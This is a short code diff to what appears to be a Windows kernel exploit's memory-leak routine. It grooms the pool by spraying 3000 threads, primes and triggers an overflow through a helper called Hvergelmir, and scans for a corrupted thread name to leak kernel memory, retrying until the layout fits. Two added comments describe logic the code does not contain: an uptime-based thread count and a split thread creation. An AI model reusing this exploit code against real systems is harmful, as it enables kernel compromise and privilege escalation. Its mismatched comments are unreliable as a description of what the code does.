@@ -69,23 +69,30 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 	tnOverflow.threadName.MaximumLength = nameSize + leakSize;
 
 
+    // Decide how many threads to create based on system uptime. Creating more threads
+	// increases the chance of desired LFH layout on freshly booted systems, but
+	// is heavier on long-running systems. Use a simple threshold (2 hours).
+
 	for (UINT64 i = 0; i < maxRetries; i++)
 	{
-		CreateThreads(3000);
-		//nameManager.FreeSlots(1000, 6);
+		// create half the threads before priming and the remainder after to mimic
+		// previous behavior while scaling counts
 
+		CreateThreads(3000);
 		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
+
+		Sleep(200);
 		Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);
 
 		leakThread = ScanForCorruptName();
 
 		if (leakThread)
 		{
-          DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
+			DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
 			CleanExtraThreads();
 			return true;
 		}
-        DEBUG_PRINT("       Retrying Pool Layout\n");
+		DEBUG_PRINT("       Retrying Pool Layout\n");
 		ClearThreads();
 
 	}
